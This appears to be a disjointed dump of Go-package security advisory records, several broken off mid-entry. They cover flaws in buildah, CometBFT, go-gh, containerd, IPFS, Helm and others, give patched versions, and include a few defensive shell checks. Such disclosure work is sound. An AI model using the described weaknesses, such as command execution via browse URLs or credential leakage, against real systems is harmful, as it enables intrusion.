"ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.25.0"},{"fixed":"1.27.4"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.24.0"},{"fixed":"1.24.7"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.28.0"},{"fixed":"1.29.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.30.0"},{"fixed":"1.31.5"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}},{"package":{"name":"github.com/containers/buildah","ecosystem":"Go","purl":"pkg:golang/github.com/containers/buildah"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.32.0"},{"fixed":"1.32.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-pmf3-c36m-g5cf/GHSA-pmf3-c36m-g5cf.json"}}],"references":[{"type":"WEB","url":"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-1753"},{"type":"WEB","url":"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087"},{"type":"WEB","url":"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5"},{"type":"WEB","url":"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8"},{"type":"WEB","url":"https://bugzilla.redhat.com/show_bug.cgi?id=2265513"},{"type":"PACKAGE","url":"https://github.com/containers/buildah"}],"database_specific":{"cwe_ids":["CWE-22"],"github_reviewed":true,"github_reviewed_at":"2024-03-19T20:06:52Z","nvd_published_at":null,"severity":"HIGH"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.397365Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-qr8r-m495-7hc4","published":"2024-01-19T15:28:44Z","modified":"2024-01-23T18:56:30.426305Z","aliases":["GO-2024-2471"],"summary":"Validation of `VoteExtensionsEnableHeight` can cause chain halt in Go package github.com/cometbft/cometbft","details":"## Summary\n\nA vulnerability in CometBFT’s validation logic for `VoteExtensionsEnableHeight` can result in a chain halt when triggered through a governance parameter change proposal on an ABCI2 Application Chain. If a parameter change proposal including a `VoteExtensionsEnableHeight` modification is passed, nodes running the affected versions may panic, halting the network.\n\nThe CometBFT team addressed this issue by improving validation logic for the `VoteExtensionsEnableHeight` to correctly handle governance proposals addressing this parameter.\n\n## Next Steps for Impacted Parties\n\nIf you are a chain developer with an active network running on CometBFT v. 0.38.x, we recommend updating your chain application to v0.38.3 or later of CometBFT to patch this issue. \n\nThis issue can be resolved with a “soft patch” to an active network, i.e. nodes can be patched and restarted at different times without the need for a coordinated upgrade that halts a chain. If this patching methodology is used, the risk of a network halt triggered by this issue is mitigated once more than 66.7% of voting power on the network has applied the update, which provides protection from exploitation while on-chain governance processes for software upgrades take place. Once all validator nodes operating a network have been updated, the risk of a network halt due to this issue will be fully resolved. \n\nFor more information about CometBFT, see https://docs.cometbft.com/. \n\nThis issue was found by Dongsam ([@b_harvest](https://twitter.com/b__harvest?lang=en)) who reported it to the Cosmos Bug Bounty Program on HackerOne on January 15, 2024.

GitHub CLI and extensions from executing arbitrary commands from compromised GitHub Enterprise Server","details":"### Summary\n\nA security vulnerability has been identified in `go-gh` where an attacker-controlled GitHub Enterprise Server could result in executing arbitrary commands on a user's machine by replacing HTTP URLs provided by GitHub with local file paths for browsing. \n\n### Details\n\nThe GitHub CLI and CLI extensions allow users to transition from their terminal for a variety of use cases through the [`Browser` capability in `github.com/cli/go-gh/v2/pkg/browser`](https://github.com/cli/go-gh/blob/61bf393cf4aeea6d00a6251390f5f67f5b67e727/pkg/browser/browser.go):\n\n- Using the `-w, --web` flag, GitHub CLI users can view GitHub repositories, issues, pull requests, and more using their web browser\n- Using the `gh codespace` command set, GitHub CLI users can transition to Visual Studio Code to work with GitHub Codespaces\n\nThis is done by using URLs provided through API responses from authenticated GitHub hosts when users execute `gh` commands.\n\nPrior to `2.12.1`, `Browser.Browse()` would attempt to open the provided URL using a variety of OS-specific approaches regardless of the scheme.  An attacker-controlled GitHub Enterprise Server could modify API responses to use a specially tailored local executable path instead of HTTP URLs to resources.  This could allow the attacker to execute arbitrary executables on the user's machine. \n\nIn `2.12.1`, `Browser.Browse()` has been enhanced to allow and disallow a variety of scenarios to avoid opening or executing files on the filesystem without unduly impacting HTTP URLs:\n\n1. URLs with `http://`, `https://`, `vscode://`, `vscode-insiders://` protocols are supported\n1. URLs with `file://` protocol are unsupported\n1. URLs matching files or directories on the filesystem are unsupported\n1. URLs matching executables in the user's path are unsupported\n\nURLs without protocols will be browsable if none of these other conditions apply.\n\nAs we have more information about use cases, maintainers can expand these capabilities for an improved user experience that allows configuring allowed URL schemes and/or prompt the user for an unexpected user case and confirming whether to continue.\n\n### Impact\n\nSuccessful exploitation could cause users of the attacker-controlled GitHub Enterprise Server to execute arbitrary commands.\n\n### Remediation and Mitigation\n\n1.

To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/","affected":[{"package":{"name":"github.com/containerd/containerd","ecosystem":"Go","purl":"pkg:golang/github.com/containerd/containerd"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.6.26"}]}],"database_specific":{"last_known_affected_version_range":"<= 1.6.25","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-7ww5-4wqc-m92c/GHSA-7ww5-4wqc-m92c.json"}},{"package":{"name":"github.com/containerd/containerd","ecosystem":"Go","purl":"pkg:golang/github.com/containerd/containerd"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.7.0"},{"fixed":"1.7.11"}]}],"database_specific":{"last_known_affected_version_range":"<= 1.7.10","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-7ww5-4wqc-m92c/GHSA-7ww5-4wqc-m92c.json"}}],"references":[{"type":"WEB","url":"https://github.com/containerd/containerd/security/advisories/GHSA-7ww5-4wqc-m92c"},{"type":"WEB","url":"https://github.com/containerd/containerd/commit/67d356cb3095f3e8f8ad7d36f9a733fea1e7e28c"},{"type":"WEB","url":"https://github.com/containerd/containerd/commit/746b910f05855c8bfdb4415a1c0f958b234910e5"},{"type":"PACKAGE","url":"https://github.com/containerd/containerd"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2023-12-19T21:17:06Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.318232Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-23qp-3c2m-xx6w","published":"2025-02-04T18:54:13Z","modified":"2025-02-06T18:03:00Z","aliases":["GO-2025-3448"],"summary":"wasmvm: Malicious smart contract can crash the chain","details":"# CWA-2025-001\n\n**Severity**\n\nMedium (Moderate + Likely)[^1]\n\n**Affected versions:**\n\n- wasmvm >= 2.2.0, < 2.2.2\n- wasmvm >= 2.1.0, < 2.1.5\n- wasmvm >= 2.0.0, < 2.0.6\n- wasmvm < 1.5.8\n\n**Patched versions:**\n\n- wasmvm 1.5.8, 2.0.6, 2.1.5, 2.2.2\n\n## Description of the bug\n\nThe vulnerability can be used to crash the chain.

[docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml) service in an environment where the docker host is directly attached to a public or untrusted IP.  In the vulnerable version, the private API endpoint is publicly forwarded by exposing it as `0.0.0.0:5001` on the host machine.  \n\nIf the host machine is hidden behind a firewall or NAT (and the LAN is trusted for NAT), this is not an immediate issue because of the protection from the firewall or NAT.  That said, we still recommend users update to follow security best practices of not putting unnecessary dependency on a working firewall.\n\n### Patches\nThis issue is in [docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml).  Users need to replace their current `docker-compose.yaml` file with a version `0.12.1` or later.\n\nThere is no need to update any of the binaries. Users running previous versions like `0.12.0` or earlier can download the `0.12.1` `docker-compose.yaml` file.  You can replace a vulnerable `docker-compose.yaml` file with a the new one with:\n\n```\ncurl https://raw.githubusercontent.com/ipfs/go-ipfs/v0.12.1/docker-compose.yaml > docker-compose.yaml\n```\n\n### How to test if you are vulnerable\n#### Binding check on the host\nOn the host machine, while IPFS is running, run as root:\n\n```bash\nnetstat -lnp | grep \":5001\"\n```\n\nThe output will be a list of listeners bound to `:5001`.\nYou then need to check that those listeners are private and preferably even localhost IPs.\n⚠️ If this listener is on `0.0.0.0` or a public IP you are very likely vulnerable.\n\n#### Remote hailing\nWhile IPFS is running, you can try to contact the API from a remote machine. (Replace `1.2.3.4` with your node public IP.  Or if you want to test in an untrusted NAT, then substitute the LAN IP instead.)\n\n```bash\ncurl -X POST http://1.2.3.4:5001/api/v0/version\n```\n\n⚠️ If you see any json outputted (e.g.,  `{\"Commit\": \"<string>\",\"Golang\": \"<string>\",\"Repo\": \"<string>\",\"System\": \"<string>\",\"Version\": \"<string>\"}`), then you are vulnerable.\n\nIf it **fails**, then you are safe.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Please first read https://docs.ipfs.io/reference/http/api/ about best practices\n* Ask in [IPFS Discord #ipfs-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)\n","affected":[{"package":{"name":"github.com/ipfs/go-ipfs","ecosystem":"Go","purl":"pkg:golang/github.com/ipfs/go-ipfs"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0.11.0"},{"fixed":"0.12.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/04/GHSA-fx5p-f64h-93xc/GHSA-fx5p-f64h-93xc.json"}}],"references":[{"type":"WEB","url":"https://github.com/ipfs/go-ipfs/security/advisories/GHSA-fx5p-f64h-93xc"},{"type":"WEB","url":"https://github.com/ipfs/go-ipfs/pull/8773"},{"type":"WEB","url":"https://github.com/ipfs/go-ipfs/commit/816a128aaf963d72c4930852ce32b9a4e31924a1"},{"type":"PACKAGE","url":"https://github.com/ipfs/go-ipfs"},{"type":"WEB","url":"https://github.com/ipfs/go-ipfs/releases/tag/v0.12.1"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-04-04T21:23:55Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.359916Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-wpfr-6297-9v57","published":"2022-02-09T22:29:01Z","modified":"2024-08-21T14:57:07.815880Z","aliases":["GO-2022-0365"],"summary":"User object created with invalid provider data in GoTrue","details":"### Impact\n_What kind of vulnerability is it?

We want to thank them for the cooperation around this report.\n\nIn contrast to their advisory, we decided to set the severity to \"Moderate\" since the provider metadata is not an inherent security feature of this GoTrue codebase or the Netlify ecosystem.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@netlify.com](mailto:security@netlify.com)\n","affected":[{"package":{"name":"github.com/netlify/gotrue","ecosystem":"Go","purl":"pkg:golang/github.com/netlify/gotrue"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.0.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/02/GHSA-wpfr-6297-9v57/GHSA-wpfr-6297-9v57.json"}}],"references":[{"type":"WEB","url":"https://github.com/netlify/gotrue/security/advisories/GHSA-wpfr-6297-9v57"},{"type":"WEB","url":"https://github.com/netlify/gotrue/pull/313"},{"type":"WEB","url":"https://github.com/netlify/gotrue/commit/4d8a3b39fe485a5f83c70617d594be01130c5b83"},{"type":"PACKAGE","url":"https://github.com/netlify/gotrue"},{"type":"WEB","url":"https://github.com/netlify/gotrue/releases/tag/v1.0.1"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-02-09T22:29:01Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.428038Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-w2j5-3rcx-vx7x","published":"2022-03-15T20:02:54Z","modified":"2024-08-21T14:57:07.683230Z","aliases":["GO-2022-0363"],"summary":"Sysctls applied to containers with host IPC or host network namespaces can affect the host","details":"### Impact\nBefore setting the sysctls for a pod, the pods namespaces must be unshared (created). However, in cases where the pod is using a host network or IPC namespace, a bug in CRI-O caused the namespace creating tool [pinns](https://github.com/cri-o/cri-o/tree/main/pinns/) to configure the sysctls of the host. This allows a malicious user to set sysctls on the host, assuming they have access to hostNetwork and hostIPC.\n\nAny CRI-O cluster after CRI-O 1.18 that drops the infra container\n1.22 and 1.23 clusters drop infra container by default, and are thus vulnerable by default.\n\n### Patches\nCRI-O versions 1.24.0, 1.23.1, 1.22.2, 1.21.5, 1.20.6, 1.19.5 all have the patches.\n\n### Workarounds\nUsers can set `manage_ns_lifecycle` to false, which causes the sysctls to be configured by the OCI runtime, which typically filter these cases. This option is available in 1.20 and 1.19.

documentation](https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md). The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation. \n\n### Detail\nSecure endpoint validation is performed by the etcd gateway start command when the --discovery-srv flag is enabled. However, as currently implemented, it only validates TCP reachability, effectively allowing connections to an endpoint that doesn't accept TLS connections through the HTTPS URL. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)","affected":[{"package":{"name":"go.etcd.io/etcd/v3","ecosystem":"Go","purl":"pkg:golang/go.etcd.io/etcd/v3"},"ranges":[{"type":"SEMVER","events":[{"introduced":"3.4.0-rc.0"},{"fixed":"3.4.10"}]}],"database_specific":{"last_known_affected_version_range":"<= 3.4.9","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-j86v-2vjr-fg8f/GHSA-j86v-2vjr-fg8f.json"}},{"package":{"name":"go.etcd.io/etcd/v3","ecosystem":"Go","purl":"pkg:golang/go.etcd.io/etcd/v3"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"3.3.23"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-j86v-2vjr-fg8f/GHSA-j86v-2vjr-fg8f.json"}}],"references":[{"type":"WEB","url":"https://github.com/etcd-io/etcd/security/advisories/GHSA-j86v-2vjr-fg8f"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-02-03T00:03:04Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.378990Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-6294-6rgp-fr7r","published":"2024-02-29T03:33:14Z","modified":"2024-07-05T21:33:55Z","aliases":["CVE-2023-50658","GHSA-mhpq-9638-x6pw","GO-2023-2409"],"related":["CGA-4vhw-vg6p-v6r7","CGA-8wc9-4vhq-pqw2","CGA-c4ph-9jh8-27mp","CGA-j6xx-gfrr-54r7","CGA-m6xq-j3m4-g4r8"],"summary":"jose2go vulnerable to denial of service via large p2c value","details":"The jose2go component before 1.6.0 for Go allows attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value.","affected":[{"package":{"name":"github.com/dvsekhvalnov/jose2go","ecosystem":"Go","purl":"pkg:golang/github.com/dvsekhvalnov/jose2go"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.6.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-6294-6rgp-fr7r/GHSA-6294-6rgp-fr7r.json"}}],"references":[{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-50658"},{"type":"WEB","url":"https://github.com/dvsekhvalnov/jose2go/issues/31"},{"type":"WEB","url":"https://github.com/dvsekhvalnov/jose2go/commit/a4584e9dd7128608fedbc67892eba9697f0d5317"},{"type":"PACKAGE","url":"https://github.com/dvsekhvalnov/jose2go"},{"type":"WEB","url":"https://github.com/dvsekhvalnov/jose2go/compare/v1.5.0...v1.6.0"},{"type":"WEB","url":"https://www.blackhat.com/us-23/briefings/schedule/#three-new-attacks-against-json-web-tokens-31695"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-03-01T16:56:03Z","nvd_published_at":"2024-02-29T01:42:01Z","severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.301777Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-hg58-rf2h-6rr7","published":"2024-06-28T14:33:33Z","modified":"2024-07-05T21:31:45Z","aliases":["GO-2024-2951"],"summary":"CometBFT is unstability during blocksync when syncing from malicious peer","details":"**Name**: ASA-2024-008: Instability during blocksync when syncing from malicious peer\n**Component**: CometBFT\n**Criticality**: Medium ([ACMv1](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md): I:Moderate; L: Possible)\n**Affected versions**: < v0.38.7 \n\n# Summary\n\nAn issue was identified for nodes syncing on an existing network during blocksync in which a malicious peer could cause the syncing peer to panic, enter into a catastrophic invalid syncing state or get stuck in blocksync mode, never switching to consensus.

Image pulls for manifests that contain a “manifests” field or indices which contain a “layers” field are rejected.\n\n### Workarounds\nEnsure you only pull images from trusted sources.\n\n### References\nhttps://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m\nhttps://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Open an issue in](https://github.com/moby/moby/issues/new)\n* Email us at [security@docker.com](mailto:security@docker.com)\n","affected":[{"package":{"name":"github.com/docker/docker","ecosystem":"Go","purl":"pkg:golang/github.com/docker/docker"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"20.10.11"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-xmmx-7jpf-fx42/GHSA-xmmx-7jpf-fx42.json"}},{"package":{"name":"github.com/moby/moby","ecosystem":"Go","purl":"pkg:golang/github.com/moby/moby"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"20.10.11"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-xmmx-7jpf-fx42/GHSA-xmmx-7jpf-fx42.json"}}],"references":[{"type":"WEB","url":"https://github.com/moby/moby/security/advisories/GHSA-xmmx-7jpf-fx42"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-06-10T18:39:03Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.434361Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-m99c-q26r-m7m7","published":"2024-04-17T17:37:23Z","modified":"2024-06-10T20:09:07Z","aliases":["GO-2024-2731"],"summary":"Evmos vulnerable to unauthorized account creation with vesting module","details":"### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nUsing the vesting module, a malicious attacker can create a new vesting account at a given\naddress, before a contract is created on that address.\n\nAddresses of smart contracts deployed to the EVM are deterministic. Therefore, it would be possible for an attacker to front-run a contract creation and create a vesting account at that address. \nWhen an address has been initialized without any contract code deployed to it, it will not be possible to upload any afterwards. In the described attack, this would mean that a malicious actor could prevent smart contracts from being deployed correctly.\n\nIn order to remediate this, an alternative user flow is being implemented for the vesting module:\n- only the account receiving the vesting funds will be able to create such an account by calling the `CreateClawbackVestingAccount` method and defining a funder address\n- vesting and lockup periods can then be created by that funder address using `FundClawbackAccount`\n\n### Patches\n_Has the problem been patched?

This could theoretically result in the creation of an invalid signature from correct inputs. However, fuzzing of higher level functions such as sign and verify were unable to produce incorrect results and there has been no reported occurrences of this issue being encountered in production use.\n\n### Description\nDuring the course of differential fuzzing of the blst library by @guidovranken it was discovered that blst would produce the incorrect result for some input values in the inverse function. This was the result of the introduction of a new inversion formula in version v0.3.0. This source of these incorrect outputs was due to two issues:\n\n1. The amount of inner loop iterations was not sufficient for the algorithm to converge.\n2. It was erroneously assumed that the absolute value of the intermediate result would be capped at 767-bits. As a result, some output values were truncated by one bit or the most significant bit was misinterpreted as the sign.\n\n### Patches\nThis issue has been resolved in the v0.3.3 release and users are recommended to upgrade immediately.\n\n### References\nThe software used to uncover this issue can be found [here](https://github.com/guidovranken/cryptofuzz).\n\n### Credits\nA special thanks to Guido Vranken (@guidovranken) for his discovery and disclosure of this vulnerability.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [hello@supranational.net](mailto:hello@supranational.net)","affected":[{"package":{"name":"github.com/supranational/blst","ecosystem":"Go","purl":"pkg:golang/github.com/supranational/blst"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0.3.0"},{"fixed":"0.3.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-x279-68rr-jp4p/GHSA-x279-68rr-jp4p.json"}}],"references":[{"type":"WEB","url":"https://github.com/supranational/blst/security/advisories/GHSA-x279-68rr-jp4p"},{"type":"WEB","url":"https://github.com/supranational/blst/commit/dd980e7f81397895705c49fcb4f52e485bb45e21"},{"type":"PACKAGE","url":"https://github.com/supranational/blst"},{"type":"WEB","url":"https://pkg.go.dev/vuln/GO-2022-1053"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-10-07T07:25:33Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.430045Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-56hp-xqp3-w2jf","published":"2021-06-23T18:14:15Z","modified":"2024-05-20T21:31:06Z","aliases":["BIT-helm-2021-32690","CVE-2021-32690","GHSA-7jr6-prv4-5wf5","GO-2022-0384"],"related":["CGA-4r32-384h-hpm8","CVE-2021-32690"],"summary":"Helm passes repository credentials to alternate domain","details":"While working on the Helm source, a Helm core maintainer discovered a situation where the username and password credentials associated with a Helm repository could be passed on to another domain referenced by that Helm repository.\n\n### Impact\n\nThe `index.yaml` within a Helm chart repository contains a reference where to get the chart archive for each version of a chart. The reference can be relative to the `index.yaml` file or a URL to location. The URL can point to any domain and this is a feature leveraged by Helm users. For example, an `index.yaml` file can be hosted on GitHub pages while the chart archives are hosted as GitHub releases. These are on different domain names and the `index.yaml` file points to the other domain.\n\nWhen a username and password were associated with a Helm repository the username and password were also passed on to other domains referenced in the `index.yaml` file. This occurred when Helm went to retrieve a specific chart archive on the other domain.\n\n### Patches\n\nThis issue has been resolved in 3.6.1.\n\nThere is a slight behavior change to credential handling with regard to repositories. Usernames and passwords are only passed to the URL location of the Helm repository by default. The username and password are scoped to the scheme, host, and port of the Helm repository. To pass the username and password to other domains Helm may encounter when it goes to retrieve a chart, the new `--pass-credentials` flag can be used. This flag restores the old behavior for a single repository as an opt-in behavior.\n\n### Workarounds\n\nIf you use a username and password for a Helm repository you can audit the Helm repository in order to check for another domain being used that could have received the credentials. In the `index.yaml` file for that repository, look for another domain in the `urls` list for the chart versions. If there is another domain found and that chart version was pulled or installed the credentials would have been passed on.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n","affected":[{"package":{"name":"helm.sh/helm/v3","ecosystem":"Go","purl":"pkg:golang/helm.sh/helm/v3"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"3.6.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-56hp-xqp3-w2jf/GHSA-56hp-xqp3-w2jf.json"}}],"references":[{"type":"WEB","url":"https://github.com/helm/helm/security/advisories/GHSA-56hp-xqp3-w2jf"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2021-32690"},{"type":"WEB","url":"https://github.com/helm/helm/commit/61d8e8c4a6f95540c15c6a65f36a6dd0a45e7a2f"},{"type":"PACKAGE","url":"https://github.com/helm/helm"},{"type":"WEB","url":"https://github.com/helm/helm/releases/tag/v3.6.1"},{"type":"WEB","url":"https://pkg.go.dev/vuln/GO-2022-0384"}],"database_specific":{"cwe_ids":["CWE-200"],"github_reviewed":true,"github_reviewed_at":"2021-06-16T19:43:50Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.296025Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-w44m-8mv2-v78h","published":"2023-06-22T20:01:48Z","modified":"2024-05-07T21:32:36Z","withdrawn":"2024-05-07T21:32:36Z","aliases":["GHSA-j2cr-jc39-wpx5","GO-2023-1861"],"summary":"Duplicate Advisory: Cosmos \"Barberry\" vulnerability in github.com/cosmos/cosmos-sdk","details":"## Withdrawn\n\nThis advisory has been withdrawn because it is a duplicate of GHSA-j2cr-jc39-wpx5.

Small values of `int` in the functions above will return a smaller subset of results than they should. For example, `RandomAlphaNumeric(1)` will always return a digit in the 0-9 range, while `RandomAlphaNumeric(4)` will return around ~7 million of the ~13M possible permutations.\n\nThis is considered a security release because programs that rely upon random generators for passwords are at an increased risk of brute force-style password guessing.

That restriction has been removed.\n\n### Patches\n\nThis issue has been corrected in v1.1.1.\n\n### Workarounds\n\nIf you cannot upgrade to v1.1.1, you can work around the issue by calling `RandomAlphaNumericCustom(N, true, true)`|`CryptoRandomAlphaNumericCustom(N, true, true)`  instead.

